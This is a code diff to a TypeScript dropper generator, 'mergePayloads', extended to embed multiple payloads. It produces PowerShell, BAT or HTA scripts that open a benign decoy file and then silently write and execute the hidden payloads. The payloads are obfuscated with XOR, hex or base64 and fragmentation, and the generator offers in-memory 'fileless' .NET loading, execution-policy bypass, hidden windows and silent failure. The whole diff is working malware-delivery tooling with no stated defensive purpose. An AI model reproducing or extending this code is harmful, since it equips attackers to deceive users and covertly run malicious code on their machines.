@@ -9,7 +9,7 @@ const FileInputSchema = z.object({
 });
 
 const MergePayloadsInputSchema = z.object({
-  payload: FileInputSchema,
+  payloads: z.array(FileInputSchema),
   benign: FileInputSchema,
   outputFormat: z.enum(['ps1', 'bat', 'hta']),
   obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
@@ -46,8 +46,7 @@ function xorEncrypt(data: string, key: string): string {
 }
 
 const generatePowershellDropper = (
-    payloadName: string, 
-    payloadString: string, 
+    payloads: { name: string, content: string }[], 
     benignName: string, 
     benignBase64: string, 
     obfuscationType: MergePayloadsInput['obfuscationType'], 
@@ -57,76 +56,80 @@ const generatePowershellDropper = (
     fileless?: boolean
 ): string => {
     
-    let payloadSection: string;
-    let payloadDecoding: string;
     let delaySection = '';
-    
     if (executionDelay && !isNaN(parseInt(executionDelay, 10))) {
         delaySection = `Start-Sleep -Seconds ${parseInt(executionDelay, 10)}`;
     }
 
-    if (useFragmentation) {
-        const chunkSize = 1000;
-        const chunks = [];
-        for (let i = 0; i < payloadString.length; i += chunkSize) {
-            chunks.push(payloadString.substring(i, i + chunkSize));
+    const payloadProcessingLoops = payloads.map((payload, index) => {
+        const varSuffix = index + 1;
+        let payloadSection: string;
+        let payloadDecoding: string;
+
+        if (useFragmentation) {
+            const chunkSize = 1000;
+            const chunks = [];
+            for (let i = 0; i < payload.content.length; i += chunkSize) {
+                chunks.push(payload.content.substring(i, i + chunkSize));
+            }
+            const chunkString = chunks.map(c => `@"${c}"@`).join(',');
+            payloadSection = `$payloadChunks${varSuffix} = ${chunkString}\n$payloadData${varSuffix} = $payloadChunks${varSuffix} -join ''`;
+        } else {
+            payloadSection = `$payloadData${varSuffix} = @"\n${payload.content}\n"@`;
         }
-        const chunkString = chunks.map(c => `@"${c}"@`).join(',');
-        payloadSection = `$payloadChunks = ${chunkString}\n$payloadData = $payloadChunks -join ''`;
-    } else {
-        payloadSection = `$payloadData = @"\n${payloadString}\n"@`;
-    }
 
-    if (obfuscationType === 'xor' && encryptionKey) {
-        payloadDecoding = `
+        if (obfuscationType === 'xor' && encryptionKey) {
+            payloadDecoding = `
 $key = "${encryptionKey}"
-$encryptedBytes = [System.Convert]::FromBase64String($payloadData)
+$encryptedBytes${varSuffix} = [System.Convert]::FromBase64String($payloadData${varSuffix})
 $keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
-$payloadFileBytes = New-Object byte[] $encryptedBytes.Length
-for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
-    $payloadFileBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
+$payloadFileBytes${varSuffix} = New-Object byte[] $encryptedBytes${varSuffix}.Length
+for ($i = 0; $i -lt $encryptedBytes${varSuffix}.Length; $i++) {
+    $payloadFileBytes${varSuffix}[$i] = $encryptedBytes${varSuffix}[$i] -bxor $keyBytes[$i % $keyBytes.Length]
 }`;
-    } else if (obfuscationType === 'hex') {
-        payloadDecoding = `
-$hexString = $payloadData -replace '[\\s\\r\\n]'
-$payloadFileBytes = New-Object byte[] ($hexString.Length / 2)
-for ($i = 0; $i -lt $hexString.Length; $i += 2) {
-    $payloadFileBytes[$i/2] = [System.Convert]::ToByte($hexString.Substring($i, 2), 16)
+        } else if (obfuscationType === 'hex') {
+            payloadDecoding = `
+$hexString${varSuffix} = $payloadData${varSuffix} -replace '[\\s\\r\\n]'
+$payloadFileBytes${varSuffix} = New-Object byte[] ($hexString${varSuffix}.Length / 2)
+for ($i = 0; $i -lt $hexString${varSuffix}.Length; $i += 2) {
+    $payloadFileBytes${varSuffix}[$i/2] = [System.Convert]::ToByte($hexString${varSuffix}.Substring($i, 2), 16)
 }`;
-    }
-    else { // 'none' or default to Base64
-        payloadDecoding = `\n$payloadFileBytes = [System.Convert]::FromBase64String($payloadData)`;
-    }
-    
-    let executionSection: string;
-
-    if (fileless) {
-        // Attempt to load and execute the assembly from memory.
-        // This assumes the payload is a .NET executable.
-        executionSection = `
+        } else { // 'none' or default to Base64
+            payloadDecoding = `\n$payloadFileBytes${varSuffix} = [System.Convert]::FromBase64String($payloadData${varSuffix})`;
+        }
+        
+        let executionSection: string;
+        if (fileless) {
+            executionSection = `
 try {
-    $assembly = [System.Reflection.Assembly]::Load($payloadFileBytes)
+    $assembly = [System.Reflection.Assembly]::Load($payloadFileBytes${varSuffix})
     $entryPoint = $assembly.EntryPoint
     if ($entryPoint) {
         $entryPoint.Invoke($null, $null)
     } else {
-        # Fallback for non-exe payloads or different structures.
-        $payloadFilePath = Join-Path $tempPath "${payloadName}"
-        [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
-        Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
+        $payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
+        [IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
+        Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden
     }
 } catch {
-    # If in-memory fails, fall back to disk.
-    $payloadFilePath = Join-Path $tempPath "${payloadName}"
-    [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
-    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
+    $payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
+    [IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
+    Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden
 }`;
-    } else {
-        executionSection = `
-$payloadFilePath = Join-Path $tempPath "${payloadName}"
-[IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)
-Start-Process -FilePath $payloadFilePath -WindowStyle Hidden`;
-    }
+        } else {
+            executionSection = `
+$payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
+[IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
+Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden`;
+        }
+
+        return `
+# Processing Payload ${varSuffix}: ${payload.name}
+${payloadSection}
+${payloadDecoding}
+${executionSection}
+`;
+    }).join('\n');
 
     return `
 $tempPath = $env:TEMP
@@ -137,14 +140,12 @@ try {
 ${benignBase64}
 "@
     
-    ${payloadSection}
-    ${payloadDecoding}
-    
     [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
     Start-Process $benignFilePath
 
     ${delaySection}
-    ${executionSection}
+
+    ${payloadProcessingLoops}
 } catch {
     # Fail silently
 }
@@ -153,90 +154,99 @@ ${benignBase64}
 
 
 /**
- * Generates a dropper script that embeds two files.
- * When run, it drops the benign file, opens it, and executes the payload.
+ * Generates a dropper script that embeds multiple files.
+ * When run, it drops the benign file, opens it, and executes the payloads.
  */
 export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
   try {
     const validatedInput = MergePayloadsInputSchema.parse(input);
-    const { payload, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless } = validatedInput;
+    const { payloads, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless } = validatedInput;
 
-    let payloadBase64 = decodeDataUri(payload.content);
-    const benignBase64 = decodeDataUri(benign.content);
+    const processedPayloads = payloads.map(payload => {
+        let payloadBase64 = decodeDataUri(payload.content);
+        let payloadString = payloadBase64; // Default to base64
 
-    let payloadString = payloadBase64; // Default to base64
-
-    if (obfuscationType === 'xor' && encryptionKey) {
-        // We encrypt the raw bytes, then Base64 encode the encrypted result
-        const rawPayload = Buffer.from(payloadBase64, 'base64');
-        const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryptionKey), 'latin1');
-        payloadString = encryptedPayload.toString('base64');
-    } else if (obfuscationType === 'hex') {
-        payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
-    }
+        if (obfuscationType === 'xor' && encryptionKey) {
+            const rawPayload = Buffer.from(payloadBase64, 'base64');
+            const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryptionKey), 'latin1');
+            payloadString = encryptedPayload.toString('base64');
+        } else if (obfuscationType === 'hex') {
+            payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
+        }
+        
+        return { name: payload.name, content: payloadString };
+    });
     
+    const benignBase64 = decodeDataUri(benign.content);
     let scriptContent = '';
 
     switch (outputFormat) {
         case 'ps1':
-            scriptContent = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
+            scriptContent = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
             break;
         
         case 'bat':
-            const psScript = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
+            const psScript = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless);
             const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
             scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
             break;
 
         case 'hta':
-            let payloadProcessingSection: string;
+            const payloadProcessingVbs = processedPayloads.map((payload, index) => {
+                const varSuffix = index + 1;
+                let payloadProcessingSection: string;
 
-            if (useFragmentation) {
-                const chunkSize = 500;
-                const chunks = [];
-                for (let i = 0; i < payloadString.length; i += chunkSize) {
-                    chunks.push(payloadString.substring(i, i + chunkSize));
+                if (useFragmentation) {
+                    const chunkSize = 500;
+                    const chunks = [];
+                    for (let i = 0; i < payload.content.length; i += chunkSize) {
+                        chunks.push(payload.content.substring(i, i + chunkSize));
+                    }
+                    const chunkString = chunks.map(c => `"${c}"`).join(" & ");
+                    payloadProcessingSection = `payloadData${varSuffix} = ${chunkString}`;
+                } else {
+                    payloadProcessingSection = `payloadData${varSuffix} = "${payload.content}"`;
                 }
-                const chunkString = chunks.map(c => `"${c}"`).join(" & ");
-                payloadProcessingSection = `payloadData = ${chunkString}`;
-            } else {
-                payloadProcessingSection = `payloadData = "${payloadString}"`;
-            }
 
-            if (obfuscationType === 'xor' && encryptionKey) {
-                payloadProcessingSection += `
-                key = "${encryptionKey}"
+                if (obfuscationType === 'xor' && encryptionKey) {
+                    payloadProcessingSection += `
+                    key = "${encryptionKey}"
+                    
+                    ' Decrypt the payload
+                    Dim encryptedBytes, keyBytes, i
+                    Set oXML = CreateObject("MSXML2.DOMDocument")
+                    Set oNode = oXML.CreateElement("base64")
+                    oNode.DataType = "bin.base64"
+                    oNode.Text = payloadData${varSuffix}
+                    encryptedBytes = oNode.NodeTypedValue
+                    
+                    keyBytes = StrToBytes(key)
+                    
+                    For i = 0 To UBound(encryptedBytes)
+                        encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
+                    Next
+                    
+                    ' Write decrypted bytes to file
+                    With CreateObject("ADODB.Stream")
+                        .Type = 1 ' adTypeBinary
+                        .Open
+                        .Write encryptedBytes
+                        .SaveToFile tempPath & "\\${payload.name}", 2 ' adSaveCreateOverWrite
+                        .Close
+                    End With
+                    `;
+                } else if (obfuscationType === 'hex') {
+                     payloadProcessingSection += `Call HexToFile(payloadData${varSuffix}, tempPath & "\\${payload.name}")`;
+                } else { // none (base64)
+                     payloadProcessingSection += `Call Base64ToFile(payloadData${varSuffix}, tempPath & "\\${payload.name}")`;
+                }
                 
-                ' Decrypt the payload
-                Dim encryptedBytes, keyBytes, i
-                Set oXML = CreateObject("MSXML2.DOMDocument")
-                Set oNode = oXML.CreateElement("base64")
-                oNode.DataType = "bin.base64"
-                oNode.Text = payloadData
-                encryptedBytes = oNode.NodeTypedValue
-                
-                keyBytes = StrToBytes(key)
-                
-                For i = 0 To UBound(encryptedBytes)
-                    encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
-                Next
-                
-                ' Write decrypted bytes to file
-                With CreateObject("ADODB.Stream")
-                    .Type = 1 ' adTypeBinary
-                    .Open
-                    .Write encryptedBytes
-                    .SaveToFile payloadFilePath, 2 ' adSaveCreateOverWrite
-                    .Close
-                End With
+                return `
+                ' Payload ${varSuffix}: ${payload.name}
+                ${payloadProcessingSection}
+                objShell.Run "cmd /c """ & tempPath & "\\${payload.name}" & """", 0, False
                 `;
-            } else if (obfuscationType === 'hex') {
-                 payloadProcessingSection += `
-                Call HexToFile(payloadData, payloadFilePath)`;
-            } else { // none (base64)
-                 payloadProcessingSection += `
-                Call Base64ToFile(payloadData, payloadFilePath)`;
-            }
+            }).join('\n');
 
             const vbsPayload = `
                 Set objShell = CreateObject("WScript.Shell")
@@ -244,16 +254,14 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
                 
                 tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
                 benignFilePath = tempPath & "\\${benign.name}"
-                payloadFilePath = tempPath & "\\${payload.name}"
 
                 benignB64 = "${benignBase64}"
                 Call Base64ToFile(benignB64, benignFilePath)
-
-                ${payloadProcessingSection}
-                
                 objShell.Run "cmd /c """ & benignFilePath & """", 0, True
+
                 ${executionDelay ? `WScript.Sleep ${parseInt(executionDelay, 10) * 1000}` : ''}
-                objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden
+                
+                ${payloadProcessingVbs}
 
                 ' Close the HTA window
                 window.close()
